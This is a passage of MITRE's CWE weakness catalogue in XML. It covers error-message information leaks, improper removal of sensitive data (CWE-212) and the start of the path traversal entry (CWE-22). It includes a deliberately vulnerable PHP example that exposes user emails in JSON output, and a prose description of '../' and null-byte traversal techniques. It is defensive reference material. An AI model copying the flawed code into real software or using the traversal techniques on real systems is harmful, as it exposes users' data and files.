               <Observed_Example_Description>Existence of user names can be determined by
						requesting a nonexistent blog and reading the error
						message.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-1409</Observed_Example_Reference>
               <Observed_Example_Description>Direct request to library file in web application
						triggers pathname leak in error message.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3060</Observed_Example_Reference>
               <Observed_Example_Description>Malformed input to login page causes leak of full
						path when IMAP call fails.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0603</Observed_Example_Reference>
               <Observed_Example_Description>Malformed regexp syntax leads to information
						exposure in error message.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference>
               <Reference_Author>Web Application Security Consortium</Reference_Author>
               <Reference_Title>Information Leakage</Reference_Title>
               <Reference_Link>http://www.webappsec.org/projects/threat/classes/information_leakage.shtml</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Brian Chess</Reference_Author>
               <Reference_Author>Jacob West</Reference_Author>
               <Reference_Title>Secure Programming with Static Analysis</Reference_Title>
               <Reference_Section>Section 9.2, page 326.</Reference_Section>
               <Reference_Publisher>Addison-Wesley</Reference_Publisher>
               <Reference_PubDate>2007</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-8">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 16, "General Good Practices." Page
						415</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 11: Failure to Handle Errors Correctly." Page
						183</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 12: Information Leakage." Page 191</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference>
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 16 - Information Exposure Through an Error
						Message</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-17</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/17/top-25-series-rank-16-information-exposure-through-an-error-message</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 3, "Overly Verbose Error Messages", Page
						75.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Accidental leaking of sensitive information through error
						messages</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Information Leakage and Improper Error
						Handling</Mapped_Node_Name>
               <Mapped_Node_ID>A6</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Improper Error Handling</Mapped_Node_Name>
               <Mapped_Node_ID>A7</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Insecure Configuration Management</Mapped_Node_Name>
               <Mapped_Node_ID>A10</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Do not allow exceptions to expose sensitive
						information</Mapped_Node_Name>
               <Mapped_Node_ID>ERR01-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not allow exceptions to transmit sensitive
						information</Mapped_Node_Name>
               <Mapped_Node_ID>ERR12-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Exposed Data</Mapped_Node_Name>
               <Mapped_Node_ID>SFP23</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>214</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>215</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>463</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>54</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>7</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name,
						Observed_Examples, Other_Notes, Potential_Mitigations, Relationships,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name,
						Potential_Mitigations, References,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2010-09-09</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Error Message Information
						Leaks</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-12-28">Error Message Information
						Leak</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="212" Name="Improper Cross-boundary Removal of Sensitive Data" Status="Incomplete" Weakness_Abstraction="Base">
         <Description>
            <Description_Summary>The software uses a resource that contains sensitive data, but
					it does not properly remove that data before it stores, transfers, or shares the
					resource with actors in another control sphere. </Description_Summary>
            <Extended_Description>
               <Text>Resources that may contain sensitive data include documents, packets,
						messages, databases, etc. While this data may be useful to an individual
						user or small set of users who share the resource, it may need to be removed
						before the resource can be shared outside of the trusted group. The process
						of removal is sometimes called cleansing or scrubbing. </Text>
               <Text>For example, software that is used for editing documents might not remove
						sensitive data such as reviewer comments or the local pathname where the
						document is stored. Or, a proxy might not remove an internal IP address from
						headers before making an outgoing request to an Internet site. </Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>200</Relationship_Target_ID>
               <!--Information Exposure--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>669</Relationship_Target_ID>
               <!--Incorrect Resource Transfer Between Spheres--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>963</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Exposed Data--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This entry is intended to be different from resultant information leaks,
						including those that occur from improper buffer initialization and reuse,
						improper encryption, interaction errors, and multiple interpretation errors.
						This entry could be regarded as a privacy leak, depending on the type of
						information that is leaked.</Text>
            </Relationship_Note>
            <Relationship_Note>
               <Text>There is a close association between CWE-226 and CWE-212. The difference
						is partially that of perspective. CWE-226 is geared towards the final stage
						of the resource lifecycle, in which the resource is deleted, eliminated,
						expired, or otherwise released for reuse. Technically, this involves a
						transfer to a different control sphere, in which the original contents of
						the resource are no longer relevant. CWE-212, however, is intended for
						sensitive data in resources that are intentionally shared with others, so
						they are still active. This distinction is useful from the perspective of
						the CWE research view (CWE-1000).</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Terminology_Notes>
            <Terminology_Note>
               <Text>The terms "cleansing" and "scrubbing" have multiple uses within computing.
						In information security, these are used for the removal of sensitive data,
						but they are also used for the modification of incoming/outgoing data so
						that it conforms to specifications. </Text>
            </Terminology_Note>
         </Terminology_Notes>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Sensitive data may be exposed to an unauthorized actor in another
							control sphere. This may have a wide range of secondary consequences
							which will depend on what data is exposed. One possibility is the
							exposure of system data allowing an attacker to craft a specific, more
							effective attack.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Clearly specify which information should be regarded as private or
							sensitive, and require that the product offers functionality that allows
							the user to cleanse the sensitive information from the resource before
							it is published or exported to other parties.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Separation of Privilege</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Compartmentalize the system to have "safe" areas where trust
							boundaries can be unambiguously drawn. Do not allow sensitive data to go
							outside of the trust boundary and always be careful when interfacing
							with a compartment outside of the safe area.</Text>
                  <Text>Ensure that appropriate compartmentalization is built into the system
							design and that the compartmentalization serves to allow for and further
							reinforce privilege separation functionality. Architects and designers
							should rely on the principle of least privilege to decide when it is
							appropriate to use and to drop system privileges.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use naming conventions and strong types to make it easier to spot when
							sensitive data is being used. When creating structures, objects, or
							other complex entities, separate the sensitive and non-sensitive data as
							much as possible.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This makes it easier to spot places in the code where data is being
							used that is unencrypted.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Avoid errors related to improper resource shutdown or release
							(CWE-404), which may leave the sensitive data within the resource if it
							is in an incomplete state.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code either generates a public HTML user information page or a
						JSON response containing the same user information. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Comment>// API flag, output JSON if set</Comment>
                     <Code>$json = $_GET['json']</Code>
                     <Code>$username = $_GET['user']</Code>
                     <Code>if(!$json)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>$record = getUserRecord($username);</Code>
                        <Code>foreach($record as $fieldName =&gt; $fieldValue)</Code>
                        <Code>{</Code>
                        <Block>
                           <Code>if($fieldName == "email_address") {</Code>
                           <Block>
                              <Comment>// skip displaying user emails</Comment>
                              <Code>continue;</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>else{</Code>
                           <Block>
                              <Code>writeToHtmlPage($fieldName,$fieldValue);</Code>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>else</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>$record = getUserRecord($username);</Code>
                        <Code>echo json_encode($record);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> The programmer is careful to not display the user's e-mail address
							when displaying the public HTML page. However, the e-mail address is not
							removed from the JSON response, exposing the user's e-mail address.
						</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0406</Observed_Example_Reference>
               <Observed_Example_Description>Some image editors modify a JPEG image, but the
						original EXIF thumbnail image is left intact within the JPEG. (Also an
						interaction error).</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0704</Observed_Example_Reference>
               <Observed_Example_Description>NAT feature in firewall leaks internal IP
						addresses in ICMP error messages.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Cross-Boundary Cleansing Infoleak</Mapped_Node_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>168</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes,
						Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Description, Name, Observed_Examples, Potential_Mitigations,
						Relationship_Notes, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2009-12-28">Cross-boundary Cleansing
						Information Leak</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Improper Cross-boundary
						Cleansing</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="22" Name="Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" Weakness_Abstraction="Class" Status="Draft">
         <Description>
            <Description_Summary>The software uses external input to construct a pathname that
					is intended to identify a file or directory that is located underneath a
					restricted parent directory, but the software does not properly neutralize
					special elements within the pathname that can cause the pathname to resolve to a
					location that is outside of the restricted directory.</Description_Summary>
            <Extended_Description>
               <Text>Many file operations are intended to take place within a restricted
						directory. By using special elements such as ".." and "/" separators,
						attackers can escape outside of the restricted location to access files or
						directories that are elsewhere on the system. One of the most common special
						elements is the "../" sequence, which in most modern operating systems is
						interpreted as the parent directory of the current location. This is
						referred to as relative path traversal. Path traversal also covers the use
						of absolute pathnames such as "/usr/local/bin", which may also be useful in
						accessing unexpected files. This is referred to as absolute path
						traversal.</Text>
               <Text>In many programming languages, the injection of a null byte (the 0 or NUL)
						may allow an attacker to truncate a generated filename to widen the scope of
						attack. For example, the software may add ".txt" to any pathname, thus
						limiting the attacker to text files, but a null injection may effectively
						remove this restriction.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>21</Relationship_Target_ID>
               <!--Pathname Traversal and Equivalence Errors--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>706</Relationship_Target_ID>
               <!--Use of Incorrectly-Resolved Name or Reference--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>668</Relationship_Target_ID>
               <!--Exposure of Resource to Wrong Sphere--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">631</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>632</Relationship_Target_ID>
               <!--Weaknesses that Affect Files or Directories--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>715</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A4 - Insecure Direct Object Reference--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>723</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A2 - Broken Access Control--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>743</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>813</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A4 - Insecure Direct Object References--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
